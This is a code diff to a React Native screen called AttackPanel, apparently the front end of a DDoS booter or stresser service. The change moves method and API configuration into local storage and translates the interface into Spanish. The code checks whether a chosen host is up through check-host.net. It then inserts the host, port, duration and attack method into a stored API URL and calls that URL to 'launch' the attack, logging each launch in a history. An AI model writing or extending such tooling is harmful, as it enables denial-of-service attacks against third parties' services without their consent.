@@ -12,15 +12,20 @@ import {
   Alert,
 } from 'react-native';
 import { Ionicons } from '@expo/vector-icons';
-import axios from 'axios';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 import { Picker } from '@react-native-picker/picker';
-
-const API_URL = process.env.EXPO_PUBLIC_BACKEND_URL;
+import axios from 'axios';
 
 interface Method {
   id: string;
   name: string;
-  api_ids: string[];
+  apiId: string;
+}
+
+interface APIConfig {
+  id: string;
+  name: string;
+  url: string;
 }
 
 export default function AttackPanel() {
@@ -29,6 +34,7 @@ export default function AttackPanel() {
   const [time, setTime] = useState('60');
   const [selectedMethod, setSelectedMethod] = useState('');
   const [methods, setMethods] = useState<Method[]>([]);
+  const [apis, setApis] = useState<APIConfig[]>([]);
   const [loading, setLoading] = useState(false);
   const [checkingTarget, setCheckingTarget] = useState(false);
   const [targetStatus, setTargetStatus] = useState<any>(null);
@@ -36,34 +42,41 @@ export default function AttackPanel() {
   const [maxTimeAllowed, setMaxTimeAllowed] = useState(300);
 
   useEffect(() => {
-    loadMethods();
-    loadSettings();
+    loadData();
   }, []);
 
-  const loadMethods = async () => {
+  const loadData = async () => {
     try {
-      const response = await axios.get(`${API_URL}/api/methods`);
-      setMethods(response.data);
-      if (response.data.length > 0) {
-        setSelectedMethod(response.data[0].name);
+      const [methodsData, apisData, settings] = await Promise.all([
+        AsyncStorage.getItem('methods'),
+        AsyncStorage.getItem('apis'),
+        AsyncStorage.getItem('settings'),
+      ]);
+
+      if (methodsData) {
+        const parsedMethods = JSON.parse(methodsData);
+        setMethods(parsedMethods);
+        if (parsedMethods.length > 0) {
+          setSelectedMethod(parsedMethods[0].name);
+        }
+      }
+
+      if (apisData) {
+        setApis(JSON.parse(apisData));
+      }
+
+      if (settings) {
+        const parsedSettings = JSON.parse(settings);
+        setMaxTimeAllowed(parsedSettings.maxTimeAllowed || 300);
       }
     } catch (error) {
-      console.error('Error loading methods:', error);
-    }
-  };
-
-  const loadSettings = async () => {
-    try {
-      const response = await axios.get(`${API_URL}/api/settings`);
-      setMaxTimeAllowed(response.data.max_time_allowed);
-    } catch (error) {
-      console.error('Error loading settings:', error);
+      console.error('Error loading data:', error);
     }
   };
 
   const checkTarget = async () => {
     if (!host) {
-      Alert.alert('Error', 'Please enter a host');
+      Alert.alert('Error', 'Por favor ingresa un host');
       return;
     }
 
@@ -71,33 +84,80 @@ export default function AttackPanel() {
     setTargetStatus(null);
 
     try {
-      // Determine check type based on host format
       const checkType = host.includes('http') ? 'http' : 'ping';
       const cleanHost = host.replace(/^https?:\/\//, '').split('/')[0];
 
-      const response = await axios.post(`${API_URL}/api/check-target`, {
-        host: cleanHost,
-        check_type: checkType,
+      const url = checkType === 'http'
+        ? `https://check-host.net/check-http?host=${cleanHost}&max_nodes=3`
+        : `https://check-host.net/check-ping?host=${cleanHost}&max_nodes=3`;
+
+      const response = await axios.get(url, {
+        headers: { Accept: 'application/json' },
+        timeout: 10000,
       });
 
-      setTargetStatus(response.data);
+      if (response.data && response.data.request_id) {
+        setTimeout(async () => {
+          try {
+            const resultUrl = `https://check-host.net/check-result/${response.data.request_id}`;
+            const resultResponse = await axios.get(resultUrl, {
+              headers: { Accept: 'application/json' },
+            });
+
+            let alive = false;
+            if (resultResponse.data) {
+              for (const key in resultResponse.data) {
+                const value = resultResponse.data[key];
+                if (value && Array.isArray(value) && value.length > 0) {
+                  alive = true;
+                  break;
+                }
+              }
+            }
+
+            setTargetStatus({
+              status: alive ? 'alive' : 'unreachable',
+              details: resultResponse.data,
+            });
+          } catch (err) {
+            setTargetStatus({ status: 'error', message: 'Error al verificar' });
+          } finally {
+            setCheckingTarget(false);
+          }
+        }, 2500);
+      } else {
+        setTargetStatus({ status: 'checking', message: 'Verificando...' });
+        setCheckingTarget(false);
+      }
     } catch (error) {
       console.error('Error checking target:', error);
-      setTargetStatus({ status: 'error', message: 'Failed to check target' });
-    } finally {
+      setTargetStatus({ status: 'error', message: 'Error al verificar el objetivo' });
       setCheckingTarget(false);
     }
   };
 
   const sendAttack = async () => {
     if (!host || !port || !time || !selectedMethod) {
-      Alert.alert('Error', 'Please fill all fields');
+      Alert.alert('Error', 'Por favor completa todos los campos');
       return;
     }
 
     const timeNum = parseInt(time);
     if (timeNum > maxTimeAllowed) {
-      Alert.alert('Error', `Time cannot exceed ${maxTimeAllowed} seconds`);
+      Alert.alert('Error', `El tiempo no puede exceder ${maxTimeAllowed} segundos`);
+      return;
+    }
+
+    // Find the method and its linked API
+    const method = methods.find((m) => m.name === selectedMethod);
+    if (!method) {
+      Alert.alert('Error', 'Método no encontrado');
+      return;
+    }
+
+    const api = apis.find((a) => a.id === method.apiId);
+    if (!api) {
+      Alert.alert('Error', 'API no configurada para este método');
       return;
     }
 
@@ -105,19 +165,56 @@ export default function AttackPanel() {
     setAttackSent(false);
 
     try {
-      const response = await axios.post(`${API_URL}/api/attack`, {
+      const cleanHost = host.replace(/^https?:\/\//, '').split('/')[0];
+      
+      // Replace placeholders in API URL
+      let attackUrl = api.url
+        .replace('[host]', cleanHost)
+        .replace('[port]', port)
+        .replace('[time]', time)
+        .replace('[method]', selectedMethod);
+
+      // Send the attack request
+      const response = await axios.get(attackUrl, { timeout: 30000 });
+
+      // Save to history
+      const historyItem = {
+        id: Date.now().toString(),
+        host: cleanHost,
+        port: parseInt(port),
+        time: timeNum,
+        method: selectedMethod,
+        status: 'sent',
+        timestamp: new Date().toISOString(),
+      };
+
+      const historyData = await AsyncStorage.getItem('history');
+      const history = historyData ? JSON.parse(historyData) : [];
+      history.unshift(historyItem);
+      await AsyncStorage.setItem('history', JSON.stringify(history.slice(0, 100)));
+
+      setAttackSent(true);
+      setTimeout(() => setAttackSent(false), 5000);
+    } catch (error: any) {
+      console.error('Error sending attack:', error);
+      
+      // Save as failed in history
+      const historyItem = {
+        id: Date.now().toString(),
         host: host.replace(/^https?:\/\//, '').split('/')[0],
         port: parseInt(port),
         time: timeNum,
         method: selectedMethod,
-      });
+        status: 'failed',
+        timestamp: new Date().toISOString(),
+      };
 
-      if (response.data.success) {
-        setAttackSent(true);
-        setTimeout(() => setAttackSent(false), 5000);
-      }
-    } catch (error: any) {
-      Alert.alert('Error', error.response?.data?.detail || 'Failed to send attack');
+      const historyData = await AsyncStorage.getItem('history');
+      const history = historyData ? JSON.parse(historyData) : [];
+      history.unshift(historyItem);
+      await AsyncStorage.setItem('history', JSON.stringify(history.slice(0, 100)));
+
+      Alert.alert('Error', 'No se pudo enviar el ataque');
     } finally {
       setLoading(false);
     }
@@ -137,7 +234,7 @@ export default function AttackPanel() {
         <View style={styles.statusPanel}>
           <View style={styles.panelHeader}>
             <Ionicons name="pulse" size={24} color="#00d4ff" />
-            <Text style={styles.panelTitle}>Target Status</Text>
+            <Text style={styles.panelTitle}>Estado del Objetivo</Text>
           </View>
 
           <TouchableOpacity
@@ -150,7 +247,7 @@ export default function AttackPanel() {
             ) : (
               <>
                 <Ionicons name="search" size={20} color="#fff" />
-                <Text style={styles.checkButtonText}>Check Target</Text>
+                <Text style={styles.checkButtonText}>Verificar Objetivo</Text>
               </>
             )}
           </TouchableOpacity>
@@ -177,10 +274,10 @@ export default function AttackPanel() {
               />
               <Text style={styles.statusText}>
                 {targetStatus.status === 'alive'
-                  ? 'Target is Online'
+                  ? 'Objetivo Online'
                   : targetStatus.status === 'unreachable'
-                  ? 'Target Unreachable'
-                  : 'Error Checking Target'}
+                  ? 'Objetivo Inalcanzable'
+                  : 'Error al Verificar'}
               </Text>
             </View>
           )}
@@ -190,16 +287,16 @@ export default function AttackPanel() {
         <View style={styles.attackPanel}>
           <View style={styles.panelHeader}>
             <Ionicons name="flash" size={24} color="#ff6b6b" />
-            <Text style={styles.panelTitle}>Attack Configuration</Text>
+            <Text style={styles.panelTitle}>Configuración de Ataque</Text>
           </View>
 
           <View style={styles.inputGroup}>
-            <Text style={styles.label}>Host / Domain</Text>
+            <Text style={styles.label}>Host / Dominio</Text>
             <TextInput
               style={styles.input}
               value={host}
               onChangeText={setHost}
-              placeholder="example.com or 192.168.1.1"
+              placeholder="ejemplo.com o 192.168.1.1"
               placeholderTextColor="#6b7280"
               autoCapitalize="none"
             />
@@ -207,7 +304,7 @@ export default function AttackPanel() {
 
           <View style={styles.row}>
             <View style={[styles.inputGroup, styles.halfWidth]}>
-              <Text style={styles.label}>Port</Text>
+              <Text style={styles.label}>Puerto</Text>
               <TextInput
                 style={styles.input}
                 value={port}
@@ -219,7 +316,7 @@ export default function AttackPanel() {
             </View>
 
             <View style={[styles.inputGroup, styles.halfWidth]}>
-              <Text style={styles.label}>Time (seconds)</Text>
+              <Text style={styles.label}>Tiempo (seg)</Text>
               <TextInput
                 style={styles.input}
                 value={time}
@@ -232,7 +329,7 @@ export default function AttackPanel() {
           </View>
 
           <View style={styles.inputGroup}>
-            <Text style={styles.label}>Method</Text>
+            <Text style={styles.label}>Método</Text>
             <View style={styles.pickerContainer}>
               <Picker
                 selectedValue={selectedMethod}
@@ -241,7 +338,7 @@ export default function AttackPanel() {
                 dropdownIconColor="#00d4ff"
               >
                 {methods.length === 0 ? (
-                  <Picker.Item label="No methods available" value="" />
+                  <Picker.Item label="No hay métodos disponibles" value="" />
                 ) : (
                   methods.map((method) => (
                     <Picker.Item
@@ -268,7 +365,7 @@ export default function AttackPanel() {
             ) : (
               <>
                 <Ionicons name="rocket" size={24} color="#fff" />
-                <Text style={styles.attackButtonText}>Launch Attack</Text>
+                <Text style={styles.attackButtonText}>Lanzar Ataque</Text>
               </>
             )}
           </TouchableOpacity>
@@ -276,13 +373,13 @@ export default function AttackPanel() {
           {attackSent && (
             <View style={styles.successBox}>
               <Ionicons name="checkmark-circle" size={32} color="#fff" />
-              <Text style={styles.successText}>Attack Sent</Text>
+              <Text style={styles.successText}>Ataque Enviado</Text>
             </View>
           )}
         </View>
 
         <Text style={styles.maxTimeNote}>
-          Max time allowed: {maxTimeAllowed} seconds
+          Tiempo máximo permitido: {maxTimeAllowed} segundos
         </Text>
       </ScrollView>
     </KeyboardAvoidingView>
@@ -407,15 +504,9 @@ const styles = StyleSheet.create({
     borderRadius: 12,
     marginTop: 8,
     gap: 12,
-    shadowColor: '#ff6b6b',
-    shadowOffset: { width: 0, height: 4 },
-    shadowOpacity: 0.3,
-    shadowRadius: 8,
-    elevation: 8,
   },
   attackButtonDisabled: {
     backgroundColor: '#475569',
-    shadowOpacity: 0,
   },
   attackButtonText: {
     color: '#fff',
